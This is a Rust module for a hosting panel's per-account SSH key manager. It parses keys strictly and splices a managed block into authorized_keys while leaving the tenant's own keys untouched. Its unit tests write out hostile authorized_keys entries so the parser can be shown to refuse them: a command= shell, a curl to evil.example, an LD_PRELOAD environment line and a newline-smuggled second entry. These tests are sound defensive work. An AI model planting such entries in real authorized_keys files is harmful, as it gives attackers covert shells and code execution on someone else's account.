//! The per-account SSH key manager (spec §11.16).
//!
//! `ssh.keys.list`, `ssh.keys.add` and `ssh.keys.remove` maintain one block
//! inside the tenant's `~/.ssh/authorized_keys`:
//!
//! ```text
//! ssh-ed25519 AAAA…  a key the tenant added by hand, before the panel existed
//!
//! # ---- BEGIN FERRUM-MANAGED KEYS ----
//! ssh-ed25519 AAAA… laptop
//! # ---- END FERRUM-MANAGED KEYS ----
//!
//! ssh-rsa AAAA…  another of the tenant's own
//! ```
//!
//! # Everything outside the markers is the tenant's
//!
//! `authorized_keys` is not a file the panel can own outright the way it owns
//! an nginx vhost. A tenant has always been able to put a key there over SFTP,
//! and a panel that quietly deleted it on the next save would be exactly the
//! behaviour §10.4 rule 2 exists to forbid. So this module splices: it finds
//! the two markers, replaces what is between them, and copies every other byte
//! through unchanged ([`splice_block`], and
//! `keys_outside_the_block_survive_a_rewrite_byte_for_byte`).
//!
//! A BEGIN with no END is a **refusal**, not a repair. The panel cannot tell
//! where a truncated block was meant to stop, and guessing wrong deletes keys
//! that let somebody into their own account.
//!
//! # Why the file is written by the tenant, not by root
//!
//! `~/.ssh` and everything in it lives inside a tenant's home, and a tenant can
//! replace any of it with a symlink. Root writing through that symlink is how a
//! file manager turns into `/etc/shadow`. So the write goes through the same
//! privilege-dropping helper as the file manager
//! ([`crate::fsops::FsRunner`]): it runs as the tenant, so a symlink can only
//! ever point somewhere the tenant could already write, and `safepath` refuses
//! symlinked components anyway. The ownership and mode sshd demands
//! (`~/.ssh` 0700, `authorized_keys` 0600, both owned by the account) come out
//! right for free, because the account is what created them.
//!
//! # Strict parsing, and no options
//!
//! An `authorized_keys` line may carry options before the key type —
//! `command="…"`, `from="…"`, `environment="…"`, `permitopen=…`. Those are not
//! decoration: `command=` replaces whatever the client asked to run, and
//! `environment=` sets variables inside the tenant's session. A panel that
//! accepted them would be letting a caller install behaviour, not a key.
//! [`parse_authorized_key`] therefore requires the *first* token to be a known
//! algorithm, which no options line can satisfy.
//!
//! Two more checks matter as much:
//!
//! * the base64 blob is decoded and its embedded algorithm name must match the
//!   declared one, so `ssh-ed25519 <an-rsa-blob>` is refused rather than stored
//!   as a lie about what the key is;
//! * RSA keys below 2048 bits are refused, and `ssh-dss` is not on the list at
//!   all — OpenSSH itself stopped accepting DSA years ago.
//!
//! And nothing a caller sent is ever written back verbatim: the stored line is
//! re-rendered from the parsed algorithm, blob and comment.

use std::path::PathBuf;
use std::time::Duration;

use async_trait::async_trait;
use base64::Engine;
use base64::engine::general_purpose::STANDARD as BASE64;
use ferrum_core::{ErrorCode, FerrumError, LinuxUser, Permission, Result, Role};
use ferrum_db::Db;
use ferrum_db::subscriptions::Subscription;
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::fsops::FsRunner;
use crate::fsops::proto::{FsData, FsRequest};
use crate::registry::{Execution, OpContext, TypedOperation};

/// Where the block starts and ends. Owned here, deliberately not in the
/// template — see the template's own header.
pub const BEGIN_MARKER: &str = "# ---- BEGIN FERRUM-MANAGED KEYS ----";
pub const END_MARKER: &str = "# ---- END FERRUM-MANAGED KEYS ----";

/// The file, relative to the tenant's home.
const AUTHORIZED_KEYS: &str = ".ssh/authorized_keys";
const SSH_DIR: &str = ".ssh";

/// sshd's `StrictModes` refuses anything more permissive than these.
const SSH_DIR_MODE: u32 = 0o700;
const AUTHORIZED_KEYS_MODE: u32 = 0o600;

/// One account's key list is capped: `authorized_keys` is read linearly by sshd
/// on every login attempt, and an unbounded list is a slow-login foot-gun as
/// well as an unbounded write.
pub const MAX_KEYS: usize = 32;

/// The longest single line accepted. A 4096-bit RSA key with a comment is
/// around 750 bytes; 8 KiB is generous and still a hard stop.
const MAX_KEY_CHARS: usize = 8 * 1024;

/// The longest comment kept. Anything longer is a paste accident.
const MAX_COMMENT_CHARS: usize = 255;

/// The whole file has a ceiling too, so a hand-edited monster cannot be read
/// into the agent's memory.
const MAX_FILE_BYTES: u64 = 512 * 1024;

/// The helper is doing three small file operations; none of them can
/// legitimately take longer than this.
const FS_TIMEOUT: Duration = Duration::from_secs(20);

/// Key algorithms the panel will store.
///
/// `ssh-dss` is absent on purpose: DSA is 1024-bit by definition and OpenSSH
/// removed it from the defaults in 7.0 and from the build in 9.8. Accepting one
/// would be storing a key that no modern sshd will honour anyway.
const ALLOWED_ALGORITHMS: &[&str] = &[
    "ssh-ed25519",
    "sk-ssh-ed25519@openssh.com",
    "ssh-rsa",
    "rsa-sha2-256",
    "rsa-sha2-512",
    "ecdsa-sha2-nistp256",
    "ecdsa-sha2-nistp384",
    "ecdsa-sha2-nistp521",
    "sk-ecdsa-sha2-nistp256@openssh.com",
];

/// The smallest RSA modulus the panel will accept.
///
/// 2048 is the floor every current guideline agrees on, and a 1024-bit key in
/// an `authorized_keys` file is a credential that looks fine and is not.
const MIN_RSA_BITS: usize = 2048;

// ---------------------------------------------------------------------------
// Parsing
// ---------------------------------------------------------------------------

/// One public key, in the only form this module stores.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SshPublicKey {
    pub algorithm: String,
    pub blob: Vec<u8>,
    pub comment: Option<String>,
}

impl SshPublicKey {
    /// The canonical single line written into the block. Rebuilt from the
    /// parsed parts, never from the caller's text.
    pub fn line(&self) -> String {
        let encoded = BASE64.encode(&self.blob);
        match &self.comment {
            Some(c) => format!("{} {} {}", self.algorithm, encoded, c),
            None => format!("{} {}", self.algorithm, encoded),
        }
    }

    /// OpenSSH's `SHA256:…` fingerprint — base64 of the digest, unpadded, which
    /// is what `ssh-keygen -l` prints and what a user will recognise.
    pub fn fingerprint(&self) -> String {
        let digest = Sha256::digest(&self.blob);
        let b64 = base64::engine::general_purpose::STANDARD_NO_PAD.encode(digest);
        format!("SHA256:{b64}")
    }

    /// Key size in bits where it is meaningful, for the UI.
    pub fn bits(&self) -> Option<usize> {
        match self.algorithm.as_str() {
            "ssh-ed25519" | "sk-ssh-ed25519@openssh.com" => Some(256),
            "ecdsa-sha2-nistp256" | "sk-ecdsa-sha2-nistp256@openssh.com" => Some(256),
            "ecdsa-sha2-nistp384" => Some(384),
            "ecdsa-sha2-nistp521" => Some(521),
            "ssh-rsa" | "rsa-sha2-256" | "rsa-sha2-512" => rsa_bits(&self.blob),
            _ => None,
        }
    }
}

fn invalid(message: impl Into<String>) -> FerrumError {
    FerrumError::new(ErrorCode::InvalidInput, message).with_field("key")
}

/// Parse one `authorized_keys` line, strictly.
///
/// Returns the key, or the reason it was refused — and the reasons are worth
/// reading: each one corresponds to something that would otherwise be smuggled
/// into a file sshd executes decisions from.
pub fn parse_authorized_key(input: &str) -> Result<SshPublicKey> {
    if input.len() > MAX_KEY_CHARS {
        return Err(invalid(format!(
            "a public key must be under {MAX_KEY_CHARS} characters"
        )));
    }

    // A key is exactly one line. A newline in the middle of one is a second
    // `authorized_keys` entry that nobody reviewed — the same class of problem
    // as a newline in a crontab command.
    if input.chars().any(|c| c.is_control()) {
        return Err(invalid(
            "a public key is a single line; control characters are not allowed",
        ));
    }

    let trimmed = input.trim();
    if trimmed.is_empty() {
        return Err(invalid("no key was given"));
    }

    let mut parts = trimmed.splitn(3, char::is_whitespace);
    let algorithm = parts.next().unwrap_or_default().trim();
    let encoded = parts.next().unwrap_or_default().trim();
    let comment = parts.next().map(str::trim).filter(|c| !c.is_empty());

    if !ALLOWED_ALGORITHMS.contains(&algorithm) {
        // This is also where an options line lands: `command="…" ssh-rsa …`
        // has `command="…"` as its first token, so it can never match.
        return Err(invalid(format!(
            "`{}` is not a supported key type — the line must start with the \
             algorithm (options such as command= are not accepted)",
            truncate_for_message(algorithm)
        )));
    }

    if encoded.is_empty() {
        return Err(invalid("the key has no body"));
    }
    let blob = BASE64
        .decode(encoded)
        .map_err(|_| invalid("the key body is not valid base64"))?;

    // The blob names its own algorithm. If the two disagree, the line is a lie
    // about what the key is, whatever the reason.
    let declared = read_ssh_string(&blob, 0)
        .ok_or_else(|| invalid("the key body is not an SSH public key"))?
        .0;
    let declared = std::str::from_utf8(declared)
        .map_err(|_| invalid("the key body is not an SSH public key"))?;
    if declared != algorithm {
        return Err(invalid(format!(
            "the key body says `{}` but the line says `{}`",
            truncate_for_message(declared),
            truncate_for_message(algorithm)
        )));
    }

    if matches!(algorithm, "ssh-rsa" | "rsa-sha2-256" | "rsa-sha2-512") {
        let bits = rsa_bits(&blob).ok_or_else(|| invalid("the RSA key body is malformed"))?;
        if bits < MIN_RSA_BITS {
            return Err(invalid(format!(
                "this RSA key is {bits} bits; {MIN_RSA_BITS} is the minimum"
            )));
        }
    }

    let comment = match comment {
        Some(c) if c.chars().count() > MAX_COMMENT_CHARS => {
            return Err(invalid(format!(
                "the key comment must be under {MAX_COMMENT_CHARS} characters"
            )));
        }
        Some(c) => Some(c.to_string()),
        None => None,
    };

    Ok(SshPublicKey {
        algorithm: algorithm.to_string(),
        blob,
        comment,
    })
}

/// Read one SSH wire string (4-byte big-endian length, then bytes) at `offset`.
fn read_ssh_string(blob: &[u8], offset: usize) -> Option<(&[u8], usize)> {
    let end = offset.checked_add(4)?;
    if blob.len() < end {
        return None;
    }
    let len = u32::from_be_bytes(blob[offset..end].try_into().ok()?) as usize;
    // A length field longer than the blob is either corruption or a deliberate
    // attempt to make a parser allocate; either way, refuse.
    let value_end = end.checked_add(len)?;
    if blob.len() < value_end {
        return None;
    }
    Some((&blob[end..value_end], value_end))
}

/// Modulus size of an `ssh-rsa` blob: `string type`, `mpint e`, `mpint n`.
fn rsa_bits(blob: &[u8]) -> Option<usize> {
    let (_, after_type) = read_ssh_string(blob, 0)?;
    let (_, after_e) = read_ssh_string(blob, after_type)?;
    let (n, _) = read_ssh_string(blob, after_e)?;
    // An mpint is signed, so a leading zero byte is padding rather than size.
    let n = n.iter().position(|b| *b != 0).map(|i| &n[i..])?;
    let first = *n.first()?;
    Some((n.len() - 1) * 8 + (8 - first.leading_zeros() as usize))
}

/// Keep an error message from echoing a whole pasted blob back at the user.
fn truncate_for_message(text: &str) -> String {
    let cleaned: String = text.chars().filter(|c| !c.is_control()).take(40).collect();
    cleaned
}

// ---------------------------------------------------------------------------
// The managed block
// ---------------------------------------------------------------------------

/// Where the block sits in a file, if it is there at all.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum BlockSpan {
    /// Line indices of the BEGIN and END markers, inclusive.
    Present {
        begin: usize,
        end: usize,
    },
    Absent,
}

fn find_block(lines: &[&str]) -> Result<BlockSpan> {
    let begin = lines.iter().position(|l| l.trim() == BEGIN_MARKER);
    let Some(begin) = begin else {
        // An END with no BEGIN is just as broken, and just as unsafe to guess at.
        if lines.iter().any(|l| l.trim() == END_MARKER) {
            return Err(FerrumError::new(
                ErrorCode::ConfigDrift,
                "authorized_keys has a Ferrum end marker with no begin marker; \
                 fix the file by hand before the panel writes to it again",
            ));
        }
        return Ok(BlockSpan::Absent);
    };
    let end = lines[begin + 1..]
        .iter()
        .position(|l| l.trim() == END_MARKER)
        .map(|offset| begin + 1 + offset)
        .ok_or_else(|| {
            FerrumError::new(
                ErrorCode::ConfigDrift,
                "authorized_keys has an unterminated Ferrum block; the panel will not \
                 guess where it ends — fix the file by hand first",
            )
        })?;
    Ok(BlockSpan::Present { begin, end })
}

/// The keys currently inside the managed block.
///
/// Lines inside the block that no longer parse are reported rather than
/// silently dropped, because "the panel lost my key" and "somebody edited the
/// block by hand" are different problems with the same symptom.
pub fn read_block(contents: &str) -> Result<Vec<SshPublicKey>> {
    let lines: Vec<&str> = contents.lines().collect();
    let BlockSpan::Present { begin, end } = find_block(&lines)? else {
        return Ok(Vec::new());
    };
    let mut keys = Vec::new();
    for line in &lines[begin + 1..end] {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        keys.push(parse_authorized_key(trimmed)?);
    }
    Ok(keys)
}

/// Put `block` (already rendered, without markers) into `contents`, replacing
/// any existing managed block and leaving every other line exactly as it was.
///
/// An empty `block` removes the managed block entirely — the correct outcome
/// when the last key is deleted, rather than leaving an empty pair of markers
/// behind for somebody to wonder about.
pub fn splice_block(contents: &str, block: &str) -> Result<String> {
    let lines: Vec<&str> = contents.lines().collect();
    let span = find_block(&lines)?;

    let mut rendered: Vec<String> = Vec::new();
    if !block.trim().is_empty() {
        rendered.push(BEGIN_MARKER.to_string());
        rendered.extend(block.lines().map(str::to_string));
        rendered.push(END_MARKER.to_string());
    }

    let mut out: Vec<String> = Vec::new();
    match span {
        BlockSpan::Present { begin, end } => {
            out.extend(lines[..begin].iter().map(|l| (*l).to_string()));
            out.extend(rendered);
            out.extend(lines[end + 1..].iter().map(|l| (*l).to_string()));
        }
        BlockSpan::Absent => {
            out.extend(lines.iter().map(|l| (*l).to_string()));
            // One blank line before the block when there is something above it,
            // so the file stays readable to whoever opens it in vi.
            if !out.is_empty() && !rendered.is_empty() && out.last().is_some_and(|l| !l.is_empty())
            {
                out.push(String::new());
            }
            out.extend(rendered);
        }
    }

    // Trailing blank lines accumulate otherwise, one per removal.
    while out.last().is_some_and(|l| l.trim().is_empty()) {
        out.pop();
    }
    if out.is_empty() {
        return Ok(String::new());
    }
    Ok(format!("{}\n", out.join("\n")))
}

// ---------------------------------------------------------------------------
// Operations
// ---------------------------------------------------------------------------

/// One key, as the API describes it. Never carries the blob: a fingerprint is
/// what identifies a key to a human, and it is what `remove` takes.
#[derive(Debug, Clone, Serialize)]
pub struct KeyView {
    pub fingerprint: String,
    pub algorithm: String,
    pub comment: Option<String>,
    pub bits: Option<usize>,
}

impl From<&SshPublicKey> for KeyView {
    fn from(key: &SshPublicKey) -> Self {
        Self {
            fingerprint: key.fingerprint(),
            algorithm: key.algorithm.clone(),
            comment: key.comment.clone(),
            bits: key.bits(),
        }
    }
}

#[derive(Debug, Deserialize)]
pub struct ListInput {
    #[serde(default)]
    pub subscription_id: Option<i64>,
}

#[derive(Debug, Serialize)]
pub struct ListOutput {
    pub keys: Vec<KeyView>,
    /// True when the tenant has entries in `authorized_keys` outside the
    /// managed block. The UI says so rather than pretending the list is the
    /// whole story.
    pub has_unmanaged_keys: bool,
}

/// `ssh.keys.list` — the keys in the panel-managed block.
pub struct List;

#[async_trait]
impl TypedOperation for List {
    type Input = ListInput;
    type Output = ListOutput;

    const NAME: &'static str = "ssh.keys.list";
    // Shell access is one plan feature with two faces (spec §6.2's `can_ssh`):
    // SFTP/SSH login, and the panel's own shell surfaces. `TerminalAccess` is
    // the one a customer's role can hold, and `ensure_can_manage_keys` below
    // re-checks the plan flag itself — so this grants nothing that `can_ssh`
    // has not already granted. `SshAccess` is deliberately not used: widening
    // *that* to customers would also widen `sftp.enable`, which is a different
    // decision belonging to a different module.
    const PERMISSION: Permission = Permission::TerminalAccess;
    const EXECUTION: Execution = Execution::Immediate;

    async fn run(&self, ctx: &OpContext, input: Self::Input) -> Result<Self::Output> {
        let target = resolve(ctx, input.subscription_id).await?;
        let contents = target.read().await?;
        let keys = read_block(&contents)?;
        Ok(ListOutput {
            has_unmanaged_keys: has_keys_outside_block(&contents)?,
            keys: keys.iter().map(KeyView::from).collect(),
        })
    }
}

#[derive(Debug, Deserialize)]
pub struct AddInput {
    #[serde(default)]
    pub subscription_id: Option<i64>,
    /// One `authorized_keys` line: `<algorithm> <base64> [comment]`.
    pub key: String,
}

#[derive(Debug, Serialize)]
pub struct AddOutput {
    pub key: KeyView,
    pub count: usize,
}

/// `ssh.keys.add` — validate a key and put it in the managed block.
pub struct Add;

#[async_trait]
impl TypedOperation for Add {
    type Input = AddInput;
    type Output = AddOutput;

    const NAME: &'static str = "ssh.keys.add";
    const PERMISSION: Permission = Permission::TerminalAccess;
    const EXECUTION: Execution = Execution::Immediate;

    async fn run(&self, ctx: &OpContext, input: Self::Input) -> Result<Self::Output> {
        let key = parse_authorized_key(&input.key)?;
        let target = resolve(ctx, input.subscription_id).await?;

        let contents = target.read().await?;
        let mut keys = read_block(&contents)?;

        let fingerprint = key.fingerprint();
        if keys.iter().any(|k| k.fingerprint() == fingerprint) {
            return Err(FerrumError::new(
                ErrorCode::AlreadyExists,
                "that key is already installed for this account",
            ));
        }
        if keys.len() >= MAX_KEYS {
            return Err(FerrumError::new(
                ErrorCode::QuotaExceeded,
                format!("an account may hold at most {MAX_KEYS} keys"),
            ));
        }

        keys.push(key.clone());
        let count = keys.len();
        target.write(ctx, &contents, &keys).await?;

        ctx.log(format!(
            "installed {} for {}",
            fingerprint,
            target.linux_user.as_str()
        ));
        Ok(AddOutput {
            key: KeyView::from(&key),
            count,
        })
    }
}

#[derive(Debug, Deserialize)]
pub struct RemoveInput {
    #[serde(default)]
    pub subscription_id: Option<i64>,
    /// The `SHA256:…` fingerprint from `ssh.keys.list`.
    pub fingerprint: String,
}

#[derive(Debug, Serialize)]
pub struct RemoveOutput {
    pub removed: bool,
    pub count: usize,
}

/// `ssh.keys.remove` — drop one key from the managed block by fingerprint.
pub struct Remove;

#[async_trait]
impl TypedOperation for Remove {
    type Input = RemoveInput;
    type Output = RemoveOutput;

    const NAME: &'static str = "ssh.keys.remove";
    const PERMISSION: Permission = Permission::TerminalAccess;
    const EXECUTION: Execution = Execution::Immediate;

    async fn run(&self, ctx: &OpContext, input: Self::Input) -> Result<Self::Output> {
        let target = resolve(ctx, input.subscription_id).await?;
        let contents = target.read().await?;
        let mut keys = read_block(&contents)?;

        let before = keys.len();
        keys.retain(|k| k.fingerprint() != input.fingerprint);
        let removed = keys.len() != before;
        if removed {
            target.write(ctx, &contents, &keys).await?;
            ctx.log(format!(
                "removed {} from {}",
                input.fingerprint,
                target.linux_user.as_str()
            ));
        }
        Ok(RemoveOutput {
            removed,
            count: keys.len(),
        })
    }
}

/// True when the file holds key lines the panel does not manage.
fn has_keys_outside_block(contents: &str) -> Result<bool> {
    let lines: Vec<&str> = contents.lines().collect();
    let span = find_block(&lines)?;
    let is_key_line = |l: &&str| {
        let t = l.trim();
        !t.is_empty() && !t.starts_with('#')
    };
    Ok(match span {
        BlockSpan::Absent => lines.iter().any(is_key_line),
        BlockSpan::Present { begin, end } => {
            lines[..begin].iter().any(is_key_line) || lines[end + 1..].iter().any(is_key_line)
        }
    })
}

/// The tenant whose `authorized_keys` an operation is about, plus the runner
/// that reaches it as that tenant.
struct Target {
    linux_user: LinuxUser,
    home: PathBuf,
    runner: FsRunner,
}

impl Target {
    /// The current file, or an empty string when there is none yet.
    async fn read(&self) -> Result<String> {
        let result = self
            .runner
            .call(
                &self.home,
                FsRequest::Read {
                    path: PathBuf::from(AUTHORIZED_KEYS),
                    max_bytes: MAX_FILE_BYTES,
                    offset: 0,
                },
                Vec::new(),
                FS_TIMEOUT,
            )
            .await;

        let (data, payload) = match result {
            Ok(pair) => pair,
            // No file yet is the normal state for a tenant who has never added
            // a key; anything else is a real failure.
            Err(e) if e.code == ErrorCode::NotFound => return Ok(String::new()),
            Err(e) => return Err(e),
        };

        if let FsData::Content {
            truncated: true, ..
        } = data
        {
            return Err(FerrumError::new(
                ErrorCode::InvalidInput,
                "authorized_keys is larger than the panel will read; trim it by hand",
            ));
        }
        String::from_utf8(payload).map_err(|_| {
            FerrumError::new(
                ErrorCode::InvalidInput,
                "authorized_keys is not valid UTF-8; the panel will not rewrite it",
            )
        })
    }

    /// Render the block, splice it into `existing`, and write the whole file
    /// back as the tenant with the modes sshd insists on.
    async fn write(&self, ctx: &OpContext, existing: &str, keys: &[SshPublicKey]) -> Result<()> {
        let block = ctx
            .config()
            .preview(
                "ssh/authorized_keys.block",
                &serde_json::json!({
                    "keys": keys.iter().map(|k| serde_json::json!({ "line": k.line() }))
                        .collect::<Vec<_>>(),
                }),
            )
            .map_err(FerrumError::from)?;
        let updated = splice_block(existing, &block)?;

        // `~/.ssh` first: sshd refuses a group- or world-writable one outright,
        // and the tenant's umask is not something the panel controls.
        self.runner
            .call(
                &self.home,
                FsRequest::Mkdir {
                    path: PathBuf::from(SSH_DIR),
                },
                Vec::new(),
                FS_TIMEOUT,
            )
            .await
            // Already there is the common case, not a failure.
            .or_else(|e| match e.code {
                ErrorCode::AlreadyExists => Ok((FsData::Done, Vec::new())),
                // The write runs as the tenant on purpose (module docs), so a
                // home the tenant cannot write into stops it dead. That is what
                // a chroot root looks like: `sftp.enable` surrenders the home to
                // `root:root 0755` and hands the tenant islands inside it.
                // `.ssh` is one of those islands now, but an account enabled
                // before that was so has none, and the bare EACCES says nothing
                // about which of the two features to reach for.
                ErrorCode::PermissionDenied => Err(FerrumError::new(
                    ErrorCode::PermissionDenied,
                    format!(
                        "cannot create `~/.ssh` for this account: its home is \
                         owned by root, so the account cannot create anything \
                         directly inside it. That is the layout `sftp.enable` \
                         leaves behind and `sftp.disable` deliberately does not \
                         undo. `sftp.enable` now creates `~/.ssh` as one of the \
                         chroot's tenant-owned directories, so running it is one \
                         fix; the other is to create `~/.ssh` owned by the \
                         account with mode 0700, which is what sshd requires of \
                         it in any case ({})",
                        e.detail
                    ),
                )),
                _ => Err(e),
            })?;
        self.chmod(SSH_DIR, SSH_DIR_MODE).await?;

        let bytes = updated.into_bytes();
        self.runner
            .call(
                &self.home,
                FsRequest::Write {
                    path: PathBuf::from(AUTHORIZED_KEYS),
                    len: bytes.len() as u64,
                    create_parents: true,
                    append: false,
                },
                bytes,
                FS_TIMEOUT,
            )
            .await?;
        self.chmod(AUTHORIZED_KEYS, AUTHORIZED_KEYS_MODE).await?;
        Ok(())
    }

    async fn chmod(&self, path: &str, mode: u32) -> Result<()> {
        self.runner
            .call(
                &self.home,
                FsRequest::Chmod {
                    path: PathBuf::from(path),
                    mode,
                    recursive: false,
                },
                Vec::new(),
                FS_TIMEOUT,
            )
            .await
            .map(|_| ())
    }
}

/// Resolve the subscription an operation names, check the plan, and build the
/// privilege-dropping runner for it.
async fn resolve(ctx: &OpContext, subscription_id: Option<i64>) -> Result<Target> {
    // Resolved through the caller's scope and never created: see
    // `terminal::resolve_subscription` for why the "default subscription"
    // helper is the wrong one here.
    let subscription = super::resolve_subscription(ctx.db(), ctx.auth(), subscription_id).await?;

    ensure_can_manage_keys(ctx.db(), ctx.auth().acting_role, &subscription).await?;

    let linux_user = LinuxUser::parse(&subscription.linux_user)?;
    Ok(Target {
        home: PathBuf::from(&subscription.home_dir),
        runner: crate::fsops::ops::runner_for(linux_user.as_str())?,
        linux_user,
    })
}

/// The plan half of the gate, matching the terminal's (spec §11.16).
///
/// A customer may only manage keys for an account their plan actually lets them
/// log in to; an admin manages any account, because they can already read and
/// write that file by every other route the panel offers.
async fn ensure_can_manage_keys(db: &Db, role: Role, subscription: &Subscription) -> Result<()> {
    if role == Role::Admin {
        return Ok(());
    }
    match db
        .plan_of_subscription(subscription.id)
        .await
        .map_err(FerrumError::from)?
    {
        Some(plan) if plan.can_ssh => Ok(()),
        Some(plan) => Err(FerrumError::new(
            ErrorCode::PlanFeatureDisabled,
            format!("plan `{}` does not include SSH access", plan.name),
        )),
        None => Err(FerrumError::new(
            ErrorCode::PlanFeatureDisabled,
            "SSH access is a plan feature and this subscription has no plan",
        )),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A real ed25519 public key blob: `string "ssh-ed25519"` then
    /// `string <32 bytes>`. Built rather than pasted so the test says what the
    /// bytes mean.
    fn ed25519_blob(seed: u8) -> Vec<u8> {
        let mut blob = Vec::new();
        let name = b"ssh-ed25519";
        blob.extend_from_slice(&(name.len() as u32).to_be_bytes());
        blob.extend_from_slice(name);
        blob.extend_from_slice(&32u32.to_be_bytes());
        blob.extend_from_slice(&[seed; 32]);
        blob
    }

    fn ed25519_line(seed: u8, comment: &str) -> String {
        format!(
            "ssh-ed25519 {} {}",
            BASE64.encode(ed25519_blob(seed)),
            comment
        )
    }

    /// `string "ssh-rsa"`, `mpint e`, `mpint n` with `bits` of modulus.
    fn rsa_blob(bits: usize) -> Vec<u8> {
        let mut blob = Vec::new();
        let name = b"ssh-rsa";
        blob.extend_from_slice(&(name.len() as u32).to_be_bytes());
        blob.extend_from_slice(name);
        let e = [0x01u8, 0x00, 0x01];
        blob.extend_from_slice(&(e.len() as u32).to_be_bytes());
        blob.extend_from_slice(&e);
        // A modulus of exactly `bits`: top bit set, so no leading-zero games.
        let mut n = vec![0u8; bits / 8];
        n[0] = 0x80;
        blob.extend_from_slice(&(n.len() as u32).to_be_bytes());
        blob.extend_from_slice(&n);
        blob
    }

    #[test]
    fn a_well_formed_key_round_trips_through_the_parser() {
        let key = parse_authorized_key(&ed25519_line(7, "farzam@laptop")).unwrap();
        assert_eq!(key.algorithm, "ssh-ed25519");
        assert_eq!(key.comment.as_deref(), Some("farzam@laptop"));
        assert_eq!(key.bits(), Some(256));
        assert!(key.fingerprint().starts_with("SHA256:"));
        // The stored line is rebuilt from the parsed parts, so parsing it again
        // must give the same key.
        assert_eq!(parse_authorized_key(&key.line()).unwrap(), key);
    }

    #[test]
    fn an_options_prefix_is_refused_so_a_key_cannot_smuggle_behaviour() {
        // `command=` replaces whatever the client asked to run; `environment=`
        // sets variables inside the session. Accepting either would let a
        // caller install behaviour rather than a credential.
        let body = ed25519_line(1, "laptop");
        for line in [
            format!("command=\"/bin/sh\" {body}"),
            format!("no-pty,command=\"curl evil.example\" {body}"),
            format!("from=\"10.0.0.0/8\" {body}"),
            format!("environment=\"LD_PRELOAD=/tmp/x.so\" {body}"),
            format!("permitopen=\"localhost:3306\" {body}"),
            format!("restrict,pty {body}"),
        ] {
            let err = parse_authorized_key(&line).unwrap_err();
            assert_eq!(err.code, ErrorCode::InvalidInput, "accepted: {line}");
        }
    }

    #[test]
    fn a_newline_inside_a_key_cannot_smuggle_a_second_entry() {
        // The same class of bug as a newline in a crontab command: one approved
        // line becomes two, and nobody reviewed the second.
        let smuggled = format!(
            "{}\ncommand=\"/bin/sh\" {}",
            ed25519_line(1, "ok"),
            ed25519_line(2, "evil")
        );
        let err = parse_authorized_key(&smuggled).unwrap_err();
        assert_eq!(err.code, ErrorCode::InvalidInput);
        assert!(err.detail.contains("single line"));

        // Carriage returns and NULs are refused for the same reason.
        for bad in ["\r", "\0", "\u{7}"] {
            let line = format!("{}{bad}", ed25519_line(3, "x"));
            assert!(parse_authorized_key(&line).is_err(), "accepted {bad:?}");
        }
    }

    #[test]
    fn a_key_body_that_disagrees_with_its_declared_type_is_refused() {
        let line = format!("ssh-rsa {}", BASE64.encode(ed25519_blob(9)));
        let err = parse_authorized_key(&line).unwrap_err();
        assert!(err.detail.contains("ssh-ed25519"), "{}", err.detail);
    }

    #[test]
    fn weak_and_obsolete_keys_are_refused() {
        // 1024-bit RSA is a credential that looks fine and is not…
        let weak = format!("ssh-rsa {}", BASE64.encode(rsa_blob(1024)));
        let err = parse_authorized_key(&weak).unwrap_err();
        assert!(err.detail.contains("1024"), "{}", err.detail);

        let ok = format!("ssh-rsa {}", BASE64.encode(rsa_blob(2048)));
        assert_eq!(parse_authorized_key(&ok).unwrap().bits(), Some(2048));

        // …and DSA is not on the list at all.
        let mut blob = Vec::new();
        blob.extend_from_slice(&7u32.to_be_bytes());
        blob.extend_from_slice(b"ssh-dss");
        let dsa = format!("ssh-dss {}", BASE64.encode(&blob));
        assert!(parse_authorized_key(&dsa).is_err());
    }

    #[test]
    fn junk_that_is_not_a_key_at_all_is_refused_without_panicking() {
        for line in [
            "",
            "   ",
            "ssh-ed25519",
            "ssh-ed25519 not-base64!!",
            "ssh-ed25519 AAAA",
            &format!("ssh-ed25519 {}", BASE64.encode([0xffu8, 0xff, 0xff, 0xff])),
            &"ssh-ed25519 ".repeat(4000),
        ] {
            assert!(parse_authorized_key(line).is_err(), "accepted {line:?}");
        }
    }

    #[test]
    fn keys_outside_the_block_survive_a_rewrite_byte_for_byte() {
        // The rule the whole module exists for (spec §10.4 rule 2): a tenant's
        // own keys are not the panel's to delete.
        let mine = ed25519_line(1, "tenant-added-by-hand");
        let other = ed25519_line(2, "from-a-colleague");
        let existing = format!("{mine}\n\n# a comment of my own\n{other}\n");

        let block = format!("{}\n", ed25519_line(3, "panel"));
        let updated = splice_block(&existing, &block).unwrap();

        assert!(updated.contains(&mine));
        assert!(updated.contains(&other));
        assert!(updated.contains("# a comment of my own"));
        assert!(updated.contains(BEGIN_MARKER));
        assert!(updated.contains(END_MARKER));

        // And a second write replaces only the block.
        let block2 = format!(
            "{}\n{}\n",
            ed25519_line(3, "panel"),
            ed25519_line(4, "phone")
        );
        let twice = splice_block(&updated, &block2).unwrap();
        assert!(twice.contains(&mine));
        assert!(twice.contains(&other));
        assert_eq!(twice.matches(BEGIN_MARKER).count(), 1);
        assert_eq!(read_block(&twice).unwrap().len(), 2);
        assert!(has_keys_outside_block(&twice).unwrap());
    }

    #[test]
    fn removing_the_last_key_removes_the_block_and_nothing_else() {
        let mine = ed25519_line(1, "mine");
        let existing = format!("{mine}\n");
        let with_block =
            splice_block(&existing, &format!("{}\n", ed25519_line(2, "panel"))).unwrap();
        let emptied = splice_block(&with_block, "").unwrap();

        assert_eq!(emptied, existing, "only the block may disappear");
        assert!(read_block(&emptied).unwrap().is_empty());
    }

    #[test]
    fn an_unterminated_block_is_refused_rather_than_guessed_at() {
        // Guessing where a truncated block ends would delete keys that let
        // somebody into their own account.
        let broken = format!("{BEGIN_MARKER}\n{}\n", ed25519_line(1, "x"));
        let err = read_block(&broken).unwrap_err();
        assert_eq!(err.code, ErrorCode::ConfigDrift);
        assert!(splice_block(&broken, "").is_err());

        let orphan_end = format!("{}\n{END_MARKER}\n", ed25519_line(1, "x"));
        assert_eq!(
            read_block(&orphan_end).unwrap_err().code,
            ErrorCode::ConfigDrift
        );
    }

    #[test]
    fn a_hand_edited_line_inside_the_block_is_reported_not_swallowed() {
        let broken = format!(
            "{BEGIN_MARKER}\ncommand=\"/bin/sh\" {}\n{END_MARKER}\n",
